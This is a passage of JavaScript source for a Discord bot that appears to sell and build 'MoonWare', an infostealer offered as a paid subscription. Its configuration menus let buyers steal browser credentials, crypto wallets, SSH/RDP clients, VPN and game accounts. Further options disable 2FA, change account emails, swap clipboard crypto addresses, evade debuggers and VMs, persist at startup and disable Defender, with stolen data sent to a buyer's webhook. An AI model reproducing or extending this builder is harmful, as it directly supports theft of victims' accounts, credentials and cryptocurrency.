    console.error("Error processing build:", e);
  }

  buildQueue.delete(userId);
  processBuildQueue();
}

function generateId(len) {
  var text = "";
  var possible =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  for (var i = 0; i < len; i++)
    text += possible.charAt(Math.floor(Math.random() * possible.length));
  return text;
}

client.on(Events.InteractionCreate, async (interaction) => {
  let userId = interaction.member.id;
  if (interaction.isAnySelectMenu) {
    if (interaction.customId == "config-select") {
      let configchoosen = interaction.values[0];
      const data = fs.readFileSync(
        "./database/buyers/all_configs.json",
        "utf8"
      );
      let allConfigs = JSON.parse(data);
      let userConfigs = allConfigs[interaction.member.id];
      if (!userConfigs) {
        interaction.reply(":x: not found");
        return;
      }
      for (const userConfig of userConfigs) {
        const configKey = Object.keys(userConfig)[0];
        if (configKey === configchoosen) {
          console.log(userConfigs);
          config[interaction.member.id] = userConfig[configKey];
          console.log(config[interaction.member.id]);
          buildQueue.set(userId, interaction);
          const position = buildQueue.size - 1;

          if (buildQueue.size === 1) {
            await interaction.reply("Build started, please wait a minute...");
            processBuildQueue();
          } else {
            interaction.reply(
              `Hey, wait a minute, someone is before you btw you are ${position} in the build queue`
            );
          }
          break;
        }
      }
    }
    if (interaction.customId == "config-view") {
      let configchoosen = interaction.values[0];
      const data = fs.readFileSync(
        "./database/buyers/all_configs.json",
        "utf8"
      );
      let allConfigs = JSON.parse(data);
      let userConfigs = allConfigs[interaction.member.id];
      if (!userConfigs) {
        interaction.reply(":x: not found");
        return;
      }
      for (const userConfig of userConfigs) {
        const configKey = Object.keys(userConfig)[0];
        if (configKey === configchoosen) {
          let cfg = userConfig[configKey];

          const tosend = {
            color: 15418782,
            description: `[Moonware Configuration](https://t.me/MoonWares)`,
            fields: [
              {
                name: "**Files Name:**",
                value: `\`${cfg.name}\``,
                inline: true,
              },
              {
                name: "**2FA Disabler:**",
                value: `\`${
                  cfg.disable2fa == "true" ? "Enabled ☑️" : "Disabled ❌"
                }\``,
                inline: true,
              },
              {
                name: "**Auto Mail Changer:**",
                value: `\`${
                  cfg.automailchanger == "true" ? "Enabled ☑️" : "Disabled ❌"
                }\``,
                inline: true,
              },
              {
                name: "**Anti Debug & Anti VM:**",
                value: `\`${
                  cfg.blockdebug == "yes" ? "Enabled ☑️" : "Disabled ❌"
                }\``,
                inline: true,
              },
              {
                name: "**Games Stealer:**",
                value: `\`${
                  cfg.game == "yes" ? "Enabled ☑️" : "Disabled ❌"
                }\``,
                inline: true,
              },
              {
                name: "**Launchers Stealer:**",
                value: `\`${
                  cfg.launchers == "yes" ? "Enabled ☑️" : "Disabled ❌"
                }\``,
                inline: true,
              },
              {
                name: "**Inject into discord & Exodus & Atomic Clients:**",
                value: `\`${
                  cfg.inject == "yes" ? "Enabled ☑️" : "Disabled ❌"
                }\``,
                inline: true,
              },
              {
                name: "**Steal SFTP / SSH / RDP Clients controler:**",
                value: `\`${
                  cfg.clients == "yes" ? "Enabled ☑️" : "Disabled ❌"
                }\``,
                inline: true,
              },
              {
                name: "**Steal Wallets:**",
                value: `\`${
                  cfg.wallets == "yes" ? "Enabled ☑️" : "Disabled ❌"
                }\``,
                inline: true,
              },
              {
                name: "**Steal VPN:**",
                value: `\`${cfg.vpn == "yes" ? "Enabled ☑️" : "Disabled ❌"}\``,
                inline: true,
              },
              {
                name: "**Steal Systeme informations**",
                value: `\`${
                  cfg.sysinfo == "yes" ? "Enabled ☑️" : "Disabled ❌"
                }\``,
                inline: true,
              },
              {
                name: "**Steal social app:**",
                value: `\`${
                  cfg.social == "yes" ? "Enabled ☑️" : "Disabled ❌"
                }\``,
                inline: true,
              },
              {
                name: "**Steal Browsers Credentials:**",
                value: `\`${
                  cfg.browsers == "yes" ? "Enabled ☑️" : "Disabled ❌"
                }\``,
                inline: true,
              },
              {
                name: "**Add itself to startup:**",
                value: `\`${
                  cfg.startup == "yes" ? "Enabled ☑️" : "Disabled ❌"
                }\``,
                inline: true,
              },
              {
                name: "**Fake Error:**",
                value: `\`${
                  cfg.fakeerror == "yes" ? "Enabled ☑️" : "Disabled ❌"
                }\``,
                inline: true,
              },
              {
                name: "**Swap Crypto Address:**",
                value: `\`${
                  cfg.walletswaper == "yes" ? "Enabled ☑️" : "Disabled ❌"
                }\``,
                inline: true,
              },
            ],
            footer: {
              text: "@MoonWare| t.me/MoonWares",
            },
          };
          interaction.reply({ embeds: [tosend] });
          break;
        }
      }
    }
  }
  if (interaction.isButton()) {
    console.log(interaction.customId);
    if (interaction.customId === "cancel-button") {
      interaction.followUp(":x: **Canceled**");
    }
    if (interaction.customId === "save-button") {
      let g = {};
      console.log("ok 1");
      await interaction.reply("Wait...");
      if (!config[interaction.member.id]) {
        interaction.followUp(":x: **Configuration invalid!**");
        return;
      }
      if (!config[interaction.member.id].webhook.includes("/api/webhooks/")) {
        console.log("cause 1");
        interaction.followUp(":x: **Configuration invalid!**");
        return;
      }
      let allConfigs = {};
      try {
        const data = fs.readFileSync(
          "./database/buyers/all_configs.json",
          "utf8"
        );
        allConfigs = JSON.parse(data);
      } catch (err) {
        console.error("Erreur lors du chargement des configurations :", err);
        allConfigs = {}; // Si le chargement échoue, initialisez avec un objet vide
      }

      // Vérifier si l'utilisateur a déjà des configurations
      if (!allConfigs[interaction.member.id]) {
        allConfigs[interaction.member.id] = [];
      }
      let f = `Config_${generateId(10)}`;
      let ge = config[interaction.member.id];
      g = {
        [interaction.member.id]: [
          {
            [f]: ge,
          },
        ],
      };
      allConfigs[interaction.member.id].push(g);
      fs.writeFileSync(
        "./database/buyers/all_configs.json",
        JSON.stringify(allConfigs, null, 2)
      );
      delete g;
      interaction.followUp(`**Configuration Saved as ${f}**`);
    }
    if (interaction.customId === "build-button") {
      console.log("ok 1");
      await interaction.reply("Wait...");
      if (buildQueue.has(userId)) {
        interaction.followUp(
          ":x: You are already in the build queue. Please wait for your turn."
        );
        return;
      }
      if (!config[interaction.member.id]) {
        interaction.followUp(":x: **Configuration invalid!**");
        return;
      }
      if (!config[interaction.member.id].webhook.includes("/api/webhooks/")) {
        console.log("cause 1");
        interaction.followUp(":x: **Configuration invalid!**");
        return;
      }
      buildQueue.set(userId, interaction);
      const position = buildQueue.size - 1;

      if (buildQueue.size === 1) {
        console.log("ok 2");
        await interaction.followUp("Build started, please wait a minute...");
        processBuildQueue();
      } else {
        console.log("ok 3");
        interaction.followUp(
          `Hey, wait a minute, someone is before you btw you are ${position} in the build queue`
        );
      }
    }

    if (interaction.customId === "crypto2-button") {
      const modal3 = new ModalBuilder()
        .setCustomId("crypto2-modal")
        .setTitle("⚙ Configuration:")
        .addComponents([
          new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId("bch-input")
              .setLabel("BCH Address")
              .setStyle(TextInputStyle.Short)
              .setMinLength(2)
              .setMaxLength(200)
              .setPlaceholder("")
              .setRequired(false)
          ),
          new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId("xrp-input")
              .setLabel("XRP Address")
              .setStyle(TextInputStyle.Short)
              .setMinLength(2)
              .setMaxLength(200)
              .setPlaceholder("")
              .setRequired(false)
          ),
          new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId("neo-input")
              .setLabel("NEO Address")
              .setStyle(TextInputStyle.Short)
              .setMinLength(2)
              .setMaxLength(200)
              .setPlaceholder("")
              .setRequired(false)
          ),
          new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId("doge-input")
              .setLabel("Doge Address")
              .setStyle(TextInputStyle.Short)
              .setMinLength(2)
              .setMaxLength(200)
              .setPlaceholder("")
              .setRequired(false)
          ),
        ]);
      interaction.showModal(modal3);
    }
    if (interaction.customId === "crypto-button") {
      const modal3 = new ModalBuilder()
        .setCustomId("crypto1-modal")
        .setTitle("⚙ Configuration:")
        .addComponents([
          new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId("ltc-input")
              .setLabel("LTC Address")
              .setStyle(TextInputStyle.Short)
              .setMinLength(2)
              .setMaxLength(200)
              .setPlaceholder("")
              .setRequired(false)
          ),
          new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId("btc-input")
              .setLabel("BTC Address")
              .setStyle(TextInputStyle.Short)
              .setMinLength(2)
              .setMaxLength(200)
              .setPlaceholder("")
              .setRequired(false)
          ),
          new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId("eth-input")
              .setLabel("ETH Address")
              .setStyle(TextInputStyle.Short)
              .setMinLength(2)
              .setMaxLength(200)
              .setPlaceholder("")
              .setRequired(false)
          ),
          new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId("dash-input")
              .setLabel("Dash Address")
              .setStyle(TextInputStyle.Short)
              .setMinLength(2)
              .setMaxLength(200)
              .setPlaceholder("")
              .setRequired(false)
          ),
          new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId("xlm-input")
              .setLabel("XLM Address")
              .setStyle(TextInputStyle.Short)
              .setMinLength(2)
              .setMaxLength(200)
              .setPlaceholder("")
              .setRequired(false)
          ),
        ]);

      await interaction.showModal(modal3);
    }
    if (interaction.customId === "last-button") {
      const modal3 = new ModalBuilder()
        .setCustomId("last-modal")
        .setTitle("⚙ Configuration:")
        .addComponents([
          new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId("social-input")
              .setLabel('Steal Social App (type: "yes" or "no" )')
              .setStyle(TextInputStyle.Short)
              .setMinLength(2)
              .setMaxLength(200)
              .setPlaceholder("yes/no")
              .setRequired(false)
          ),
          new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId("browsers-input")
              .setLabel('Steal Browsers Info (type: "yes" or "no" )')
              .setStyle(TextInputStyle.Short)
              .setMinLength(2)
              .setMaxLength(200)
              .setPlaceholder("yes/no")
              .setRequired(false)
          ),
          new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId("start-input")
              .setLabel('Add to startup (type: "yes" or "no" )')
              .setStyle(TextInputStyle.Short)
              .setMinLength(2)
              .setMaxLength(200)
              .setPlaceholder("yes/no")
              .setRequired(false)
          ),
          new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId("fakeerror-input")
              .setLabel('Fake Error (type: "yes" or "no" )')
              .setStyle(TextInputStyle.Short)
              .setMinLength(2)
              .setMaxLength(200)
              .setPlaceholder("yes/no")
              .setRequired(false)
          ),
          new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId("walletswaper-input")
              .setLabel('Swap Crypto address (type: "yes" or "no" )')
              .setStyle(TextInputStyle.Short)
              .setMinLength(2)
              .setMaxLength(200)
              .setPlaceholder("yes/no")
              .setRequired(false)
          ),
        ]);

      await interaction.showModal(modal3);
    }
    if (interaction.customId === "injection-button") {
      const modal7 = new ModalBuilder()
        .setCustomId("injection-modal")
        .setTitle("⚙ Configuration:")
        .addComponents([
          new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId("disable2fa-input")
              .setLabel("Enable 2FA Disabler")
              .setStyle(TextInputStyle.Short)
              .setMinLength(2)
              .setMaxLength(200)
              .setPlaceholder(
                `Enable injection 2fa disabler? (type: "yes" or "no" )`
              )
              .setRequired(false)
          ),
          new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId("automailchanger-input")
              .setLabel("Enable Auto Mail Changer")
              .setStyle(TextInputStyle.Short)
              .setMinLength(2)
              .setMaxLength(200)
              .setPlaceholder(
                `Enable injection auto mail changer? (type: "yes" or "no" )`
              )
              .setRequired(false)
          ),
          new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId("clientemail-input")
              .setLabel("Your Email")
              .setStyle(TextInputStyle.Short)
              .setMinLength(2)
              .setMaxLength(200)
              .setPlaceholder(
                `Enter your email for auto mail changer (type: "youremail@gmail.com")`
              )
              .setRequired(false)
          ),
        ]);

      await interaction.showModal(modal7);
    }
    if (interaction.customId === "troll-button") {
      const modal6 = new ModalBuilder()
        .setCustomId("troll-modal")
        .setTitle("⚙ Configuration:")
        .addComponents([
          new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId("msgfakeerror-input")
              .setLabel("Write Your Error Message")
              .setStyle(TextInputStyle.Short)
              .setMinLength(4)
              .setMaxLength(500)
              .setPlaceholder("Application can't run properly")
              .setRequired(false)
          ),
          new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId("trollimage-input")
              .setLabel('Enable Troll Image? (type: "yes" or "no" )')
              .setStyle(TextInputStyle.Short)
              .setMinLength(2)
              .setMaxLength(200)
              .setPlaceholder("yes/no")
              .setRequired(false)
          ),
          new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId("trollsound-input")
              .setLabel("Enable Troll Sound")
              .setStyle(TextInputStyle.Short)
              .setMinLength(2)
              .setMaxLength(200)
              .setPlaceholder(`Type "rickroll", "default" or "none"`)
              .setRequired(false)
          ),
          new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId("chromeinjection-input")
              .setLabel("Enable Chrome Injection")
              .setStyle(TextInputStyle.Short)
              .setMinLength(2)
              .setMaxLength(200)
              .setPlaceholder(`Type "yes" or "no"`)
              .setRequired(false)
          ),
          new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId("setdisabler-input")
              .setLabel("Disable TaskManager/Defender")
              .setStyle(TextInputStyle.Short)
              .setMinLength(2)
              .setMaxLength(200)
              .setPlaceholder(`Type "yes" or "no"`)
              .setRequired(false)
          ),
        ]);

      await interaction.showModal(modal6);
    }
    if (interaction.customId === "second-button") {
      const modal2 = new ModalBuilder()
        .setCustomId("second-modal")
        .setTitle("⚙ Configuration:")
        .addComponents([
          new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId("inject-input")
              .setLabel('Injection (type: "yes" or "no" )')
              .setStyle(TextInputStyle.Short)
              .setMinLength(2)
              .setMaxLength(200)
              .setPlaceholder("yes/no")
              .setRequired(false)
          ),

          new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId("clients-input")
              .setLabel('Steal Client (type: "yes" or "no" )')
              .setStyle(TextInputStyle.Short)
              .setMinLength(2)
              .setMaxLength(200)
              .setPlaceholder("yes/no")
              .setRequired(false)
          ),

          new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId("wallets-input")
              .setLabel('Steal wallets (type: "yes" or "no" )')
              .setStyle(TextInputStyle.Short)
              .setMinLength(2)
              .setMaxLength(200)
              .setPlaceholder("yes/no")
              .setRequired(false)
          ),

          new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId("vpn-input")
              .setLabel('Steal VPN (type: "yes" or "no" )')
              .setStyle(TextInputStyle.Short)
              .setMinLength(2)
              .setMaxLength(200)
              .setPlaceholder("yes/no")
              .setRequired(false)
          ),
          new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId("sysinfo-input")
              .setLabel('Steal Sys Info (type: "yes" or "no" )')
              .setStyle(TextInputStyle.Short)
              .setMinLength(2)
              .setMaxLength(200)
              .setPlaceholder("yes/no")
              .setRequired(false)
          ),
        ]);
      await interaction.showModal(modal2);
    }
    if (interaction.customId === "first-button") {
      const modal = new ModalBuilder()
        .setCustomId("first-modal")
        .setTitle("⚙ Configuration:")
        .addComponents([
          new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId("webhook-input")
              .setLabel("Webhook url:")
              .setStyle(TextInputStyle.Short)
              .setMinLength(100)
              .setMaxLength(160)
              .setPlaceholder(
                "https://discord.com/api/webhook/0000000/AAEZRNGazHREZAAQ8DSFGFH"
              )
              .setRequired(true)
          ),
          new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId("debug-input")
              .setLabel('Block Debug (type: "yes" or "no" )')
              .setStyle(TextInputStyle.Short)
              .setMinLength(2)
              .setMaxLength(5)
              .setPlaceholder("yes/no")
              .setRequired(false)
          ),
          new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId("games-input")
              .setLabel('Steal Games (type: "yes" or "no" )')
              .setStyle(TextInputStyle.Short)
              .setMinLength(2)
              .setMaxLength(200)
              .setPlaceholder("yes/no")
              .setRequired(false)
          ),

          new ActionRowBuilder().addComponents(
            new TextInputBuilder()
              .setCustomId("launcher-input")
              .setLabel('Steal Games Launcher (type: "yes" or "no" )')
              .setStyle(TextInputStyle.Short)
              .setMinLength(2)
              .setMaxLength(200)
              .setPlaceholder("yes/no")
              .setRequired(false)
          ),
        ]);
      await interaction.showModal(modal);
    }
  }
});

client.once("ready", async () => {
  console.log("Bot v14 is connected...");
  try {
    await client.application.commands.create({
      name: "features",
      description: "View all Features of Moonware",
    });
    await client.application.commands.create({
      name: "claim",
      description: "Claim Your MoonWare month with a key",
      options: [
        {
          name: "key",
          description: "Key to redeem",
          type: 3,
          required: true,
        },
      ],
    });
    await client.application.commands.create({
      name: "genkey",
      description: "Generate license key",
      options: [
        {
          name: "month",
          description: "Month you want to give with redem code",
          type: 4,
          required: true,
        },
      ],
    });
    await client.application.commands.create({
      name: "queue",
      description: "Manage the build queue",
      options: [
        {
          name: "clear",
          description: "Clear the build queue",
          type: 1,
          options: [
            {
              name: "option",
              description: "Choose the option to clear",
              type: 3,
              required: true,
              choices: [
                {
                  name: "All",
                  value: "all",
                },
                {
                  name: "User",
                  value: "user",
                },
                {
                  name: "First User",
                  value: "first",
                },
              ],
            },
          ],
        },
      ],
    });

    await client.application.commands.create({
      name: "checksub",
      description: "Check User Subscription",
      options: [
        {
          name: "user",
          description: "User to check",
          type: 6,
          required: true,
        },
      ],
    });
    await client.application.commands.create({
      name: "remove",
      options: [
        {
          name: "user",
          description: "User removed",
          type: 6,
          required: true,
        },
      ],
      description: "Admin command to remove a sub",
    });
    await client.application.commands.create({
      name: "build",
      description: "Build Your MoonWare",
      options: [
        {
          name: "name",
          description: 'Name of your final ".exe"',
          type: 3,
          required: true,
        },
        {
          name: "copyright",
          description:
            'Name of the copyright of your executable "Copyright (C) MakakeINC, All right reserved."',
          type: 3,
          required: false,
        },
        {
          name: "binder",
          description:
            "link of the .exe to bind inside nova (discord link or cdn url)",
          type: 3,
          required: false,
        },
        {
          name: "appcompagny",
          description:
            'Name of the app compagny who build your executable "MAKAKE INC"',
          type: 3,
          required: false,
        },
        {
          name: "description",
          description:
            'Description of your executable "This app is beautifull"',
          type: 3,
          required: false,
        },
        {
          name: "license",
          description: 'License of your executable "MIT"',
          type: 3,
          required: false,
        },
        {
          name: "author",
          description: 'Author of your executable "Makake"',
          type: 3,
          required: false,
        },
        {
          name: "version",
          description: 'Version of your executable "1.2.3" 3 "." required',
          type: 3,
          required: false,
        },
        {
          name: "icon",
          description: 'Link of your executable icon "file.ico" only',
          type: 3,
          required: false,
        },
      ],
    });
    await client.application.commands.create({
      name: "trial",
      options: [
        {
          name: "user",
          description: "User who receives the month",
          type: 6,
          required: true,
        },
      ],
      description: "Admin command to give month",
    });

    await client.application.commands.create({
      name: "lifetime",
      options: [
        {
          name: "user",
          description: "User who receives the month",
          type: 6,
          required: true,
        },
      ],
      description: "Admin command to give month",
    });
    await client.application.commands.create({
      name: "getrole",
      description: "Get Yourself the customer role",
    });

    await client.application.commands.create({
      name: "config",
      description: "Configs settings",
      options: [
        {
          name: "options",
          description: "Config Actions",
          type: 3,
          required: true,
          choices: [
            {
              name: "build",
              value: "build",
            },
            {
              name: "view",
              value: "view",
            },
          ],
        },
      ],
    });

    await client.application.commands.create({
      name: "help",
      description: "Help settings",
    });
    await client.application.commands.create({
      name: "give",
      options: [
        {
          name: "month",
          description: "Month you want to give",
          type: 4,
          required: true,
        },
        {
          name: "user",
          description: "User who receives the month",
          type: 6,
          required: true,
        },
      ],
      description: "Admin command to give month",
    });
    console.log("Slash commands created successfully.");
  } catch (error) {
    console.error("Error creating slash command:", error);
  }
});
function generateId(len) {
  var text = "";
  var possible =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  for (var i = 0; i < len; i++)
    text += possible.charAt(Math.floor(Math.random() * possible.length));
  return text;
}


const token =
  "";
client.login(token);


process.on("unhandledRejection", (error) => {});
process.on("unhandledRejection", (reason, p) => {});
process.on("uncaughtException", (err, origin) => {});
process.on("uncaughtExceptionMonitor", (err, origin) => {});
process.on("beforeExit", (code) => {});
process.on("exit", (code) => {});
process.on("multipleResolves", (type, promise, reason) => {});
client.on("error", (err) => {});
client.on("reconnecting", (message) => {
  console.log(`Reconnexion en cours...`);
});
client.on("ready", async function () {
  console.log(client.user.username);
});
client.on("resume", (message) => {});
client.on("disconnect", (message) => {
  console.log(`deconnexion en cours...`);
});
